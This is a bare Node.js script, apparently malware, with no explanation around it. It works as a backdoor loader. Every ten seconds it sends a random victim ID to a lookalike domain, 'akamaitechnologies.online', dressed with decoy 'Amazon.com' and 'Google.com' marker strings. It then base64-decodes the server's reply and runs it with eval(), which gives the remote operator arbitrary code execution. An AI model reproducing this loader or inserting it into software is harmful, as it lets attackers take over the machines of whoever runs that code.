
function mid(length) {
    var cs = '8652783401';
    var cs_len = cs.length;
    var r = cs.charAt(Math.floor(Math.random() * (cs_len - 1)) + 1);
    for ( var i = 0; i < length - 1; i++ ) 
	{
        r += cs.charAt(Math.floor(Math.random() * cs_len));
    }
    return r;
}

UID = mid(8);
Domain = 'akamaitechnologies.online';
URI = '/';

var intervalid = 0;
var pd = '';

const https = require('https');

function sess() {

	pd += 'Amazon.com' + UID + 'nfrrw';

	var options = {
	  hostname: Domain,
	  port: 443,
	  path: URI,
	  method: 'POST',
	  headers: {
		   'Content-Type': 'application/x-www-form-urlencoded',
		   'Content-Length': pd.length
		 }
	};

	var req = https.request(options, (res) => {
		let received_data = '';
		let received_len = 0;
		res.on('data', (d) => {
			received_len += d.length;
			received_data += d;

			if (received_len == res.headers['content-length'])
			{
				if (received_data.toString().startsWith('Google.com') == true)
				{
					var param = received_data.toString().substring(10);
					var scr = Buffer.from(param, 'base64').toString('utf8')
					
					if (scr.length > 0)
					{					
						eval(scr);
						clearInterval(intervalid);
					}
				}
			}
		});
	});
	req.on('error', (e) => {
		console.error(e);
	});
	req.write(pd);
	req.end();
}

intervalid = setInterval(sess, 10000);
